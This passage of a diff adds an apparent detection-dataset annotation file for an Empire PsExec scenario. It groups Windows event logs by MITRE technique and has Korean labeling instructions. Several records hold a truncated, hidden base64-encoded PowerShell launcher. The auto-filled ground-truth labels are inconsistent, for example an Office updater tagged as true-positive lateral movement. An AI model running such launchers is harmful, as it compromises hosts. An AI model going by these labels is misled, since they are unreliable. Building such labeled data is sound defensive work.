@@ -1,0 +1,3079 @@
+{
+  "scenario": "empire_psexec_dcerpc_tcp_svcctl_2020-09-20121608",
+  "total_groups": 26,
+  "instruction": "각 그룹의 sample_logs와 anchor를 확인한 뒤 gt_ 필드를 채워주세요. gt_is_true_positive: 해당 그룹이 실제 공격 행위인지 (true/false). gt_technique_id: 실제 MITRE technique ID (예: T1059.001). gt_tactic: 실제 tactic 이름 (예: Execution). gt_notes: 판단 근거나 메모.",
+  "groups": [
+    {
+      "group_id": "T1021_002_288",
+      "rule_technique_id": "T1021.002",
+      "rule_technique_name": "SMB/Windows Admin Shares",
+      "confidence": 0.11,
+      "anchor": {
+        "idx": 288,
+        "EventID": 4624,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:29.568000+00:00"
+      },
+      "num_events": 5,
+      "event_id_distribution": {
+        "4624": 5
+      },
+      "sample_logs": [
+        {
+          "idx": 288,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:16:29.568000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 700,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:16:43.844000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 702,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:16:43.846000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 710,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:16:43.849000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 726,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:16:43.856000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "SMB/Windows Admin Shares",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw"
+    },
+    {
+      "group_id": "T1021_002_3198",
+      "rule_technique_id": "T1021.002",
+      "rule_technique_name": "SMB/Windows Admin Shares",
+      "confidence": 0.17,
+      "anchor": {
+        "idx": 3198,
+        "EventID": 4624,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:29.494000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "4624": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 3198,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:17:29.494000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "SMB/Windows Admin Shares",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw"
+    },
+    {
+      "group_id": "T1021_003_362",
+      "rule_technique_id": "T1021.003",
+      "rule_technique_name": "Distributed Component Object Model",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 362,
+        "EventID": 1,
+        "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+        "CommandLine": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe\" /frequentupdate SCHEDULEDTASK displaylevel=False",
+        "TimeCreated": "2020-09-20 16:16:39.626000+00:00"
+      },
+      "num_events": 446,
+      "event_id_distribution": {
+        "7": 327,
+        "12": 84,
+        "11": 13,
+        "13": 6,
+        "18": 5,
+        "3": 4,
+        "17": 2,
+        "1": 1,
+        "23": 1,
+        "5": 1,
+        "4624": 1,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 362,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:39.626000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe\" /frequentupdate SCHEDULEDTASK displaylevel=False",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 365,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:39.628000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}"
+        },
+        {
+          "idx": 366,
+          "EventID": 13,
+          "TimeCreated": "2020-09-20 16:16:39.628000+00:00",
+          "Image": "C:\\windows\\system32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}\\DynamicInfo"
+        },
+        {
+          "idx": 367,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.629000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 368,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.629000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 369,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.630000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 370,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 371,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 372,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.631000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 373,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.633000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 374,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.634000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 375,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.635000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 378,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 376,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 377,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:39.636000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Distributed Component Object Model",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: rule-fam-strong(T1021.003,c=1.00)"
+    },
+    {
+      "group_id": "T1021_003_2781",
+      "rule_technique_id": "T1021.003",
+      "rule_technique_name": "Distributed Component Object Model",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 2781,
+        "EventID": 4624,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:17.175000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "4624": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 2781,
+          "EventID": 4624,
+          "TimeCreated": "2020-09-20 16:17:17.175000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Distributed Component Object Model",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw"
+    },
+    {
+      "group_id": "T1059_1056",
+      "rule_technique_id": "T1059",
+      "rule_technique_name": "Command and Scripting Interpreter",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1056,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+        "TimeCreated": "2020-09-20 16:16:57.114000+00:00"
+      },
+      "num_events": 631,
+      "event_id_distribution": {
+        "7": 271,
+        "12": 264,
+        "4103": 60,
+        "11": 10,
+        "13": 8,
+        "1": 5,
+        "3": 4,
+        "5": 2,
+        "23": 2,
+        "17": 2,
+        "10": 1,
+        "22": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 802,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 803,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 804,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 805,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 806,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 809,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 812,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 814,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 815,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 817,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.911000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 816,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.911000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 818,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.912000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 820,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.913000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 821,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 822,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Command and Scripting Interpreter",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1059_1072",
+      "rule_technique_id": "T1059",
+      "rule_technique_name": "Command and Scripting Interpreter",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1072,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell  -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABl",
+        "TimeCreated": "2020-09-20 16:16:57.124000+00:00"
+      },
+      "num_events": 1588,
+      "event_id_distribution": {
+        "10": 750,
+        "12": 340,
+        "7": 271,
+        "13": 74,
+        "4103": 60,
+        "4656": 43,
+        "4663": 23,
+        "11": 10,
+        "1": 5,
+        "3": 4,
+        "5": 2,
+        "23": 2,
+        "17": 2,
+        "22": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 777,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.880000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 778,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.880000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 799,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.904000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 802,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 803,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 804,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 805,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 806,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 807,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 808,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.906000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 810,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 809,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 811,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.908000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 812,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 813,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Command and Scripting Interpreter",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1059_003_1225",
+      "rule_technique_id": "T1059.003",
+      "rule_technique_name": "Windows Command Shell",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1225,
+        "EventID": 4688,
+        "Image": "nan",
+        "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+        "TimeCreated": "2020-09-20 16:16:58.222000+00:00"
+      },
+      "num_events": 352,
+      "event_id_distribution": {
+        "7": 271,
+        "4103": 60,
+        "11": 10,
+        "1": 5,
+        "3": 4,
+        "4688": 1,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 802,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 803,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 804,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 805,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 806,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 809,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 812,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 814,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 815,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 817,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.911000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 816,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.911000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 818,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.912000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 820,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.913000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 821,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 822,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:50.914000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Windows Command Shell",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1027_1239",
+      "rule_technique_id": "T1027",
+      "rule_technique_name": "Obfuscated Files or Information",
+      "confidence": 0.71,
+      "anchor": {
+        "idx": 1239,
+        "EventID": 4688,
+        "Image": "nan",
+        "CommandLine": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell  -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABl",
+        "TimeCreated": "2020-09-20 16:16:58.227000+00:00"
+      },
+      "num_events": 1582,
+      "event_id_distribution": {
+        "10": 750,
+        "12": 340,
+        "7": 271,
+        "13": 74,
+        "4103": 60,
+        "4656": 43,
+        "4663": 23,
+        "11": 10,
+        "1": 5,
+        "3": 4,
+        "4688": 1,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 799,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.904000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 802,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 803,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 804,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 805,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 806,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
